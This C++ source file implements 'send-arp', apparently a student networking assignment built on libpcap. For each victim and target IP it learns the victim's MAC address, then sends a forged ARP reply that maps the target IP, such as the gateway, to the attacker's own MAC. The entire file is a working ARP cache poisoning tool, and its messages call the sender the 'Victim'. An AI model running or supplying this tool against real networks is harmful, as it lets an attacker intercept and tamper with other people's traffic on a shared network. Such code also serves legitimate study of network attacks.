#include <cstdio>
#include <pcap.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

bool getMyInfo(char* dev, Ip* MyIp, Mac* myMac)
{
    char mac[32];
    struct ifreq ifr;
    int sock = socket(PF_INET, SOCK_STREAM, 0);

    if(sock==-1) {
        printf("Error : socket failed\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name)-1);
    ifr.ifr_name[sizeof(ifr.ifr_name)-1]='\0';

    if(ioctl(sock, SIOCGIFADDR, &ifr)==-1) {
        printf("Error : IP error\n");
        return false;
    }
    *MyIp=Ip(inet_ntoa(((struct sockaddr_in *)(&ifr.ifr_netmask))->sin_addr));

    if(ioctl(sock, SIOCGIFHWADDR, &ifr)==-1) {
        printf("Error : MAC error\n");
        return false;
    }
    for(int i=0, k=0; i<6; i++) {
        k += snprintf(mac+k, sizeof(mac)-k-1, i ? ":%02x" : "%02x", (int)(unsigned int)(unsigned char)ifr.ifr_hwaddr.sa_data[i]);
    }
    mac[sizeof(mac)-1]='\0';
    *myMac=Mac(mac);

    return true;
}

bool sendArp(pcap_t* handle, Ip sip, Ip tip, Mac sMac, Mac tMac, uint8_t op)
{

    EthArpPacket packet;

    packet.eth_.dmac_ = tMac;
    packet.eth_.smac_ = sMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = sMac;
    packet.arp_.sip_ = htonl(sip);
    if(op==ArpHdr::Request)
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    else packet.arp_.tmac_ = tMac;
    packet.arp_.tip_ = htonl(tip);


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        printf( "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc%2 == 1 ) {// input : 2n+1 argument
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    Ip myIP;
    Mac myMAC;
    if(!getMyInfo(dev, &myIP, &myMAC)) {
       return -1;
    }

    printf("IP : %s\nMAC : %s\n", std::string(myIP).c_str(), std::string(myMAC).c_str());


    for(int i=2;i<argc;i+=2) {
        Ip sip(argv[i]), tip(argv[i+1]);
        Mac sMac;

        if(!sendArp(handle, myIP, sip, myMAC, Mac("ff:ff:ff:ff:ff:ff"), ArpHdr::Request )) {
            printf("Error by sending arp, skip %d \n", i/2);
            continue;
        }

        const u_char* packet;
        struct pcap_pkthdr* header;

        while(true) { //finding Arp reply
            int res=pcap_next_ex(handle, &header, &packet);
            if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d, skip input %d\n", res, i/2);
                continue;
            }

            EthArpPacket* EApacket=(EthArpPacket*)packet;

            if(ntohs(EApacket->eth_.type_) != EthHdr::Arp) {
                 continue;
            }
            else if(ntohs(EApacket->arp_.op_) != ArpHdr::Reply) {
                continue;
            }
            else if(ntohl(EApacket->arp_.sip_) != sip) {
                continue;
            }
            sMac=Mac(EApacket->eth_.smac_);
            printf("Sender Mac : %s\n", std::string(sMac).c_str());
            break;
        }
        if(!sendArp(handle, tip, sip, myMAC, sMac, ArpHdr::Reply)) {
            printf("Error send Arp to Victim, skipped %d\n", i/2);
            continue;
        }
        printf("%d round success!\n", i/2);
    }
	pcap_close(handle);
}
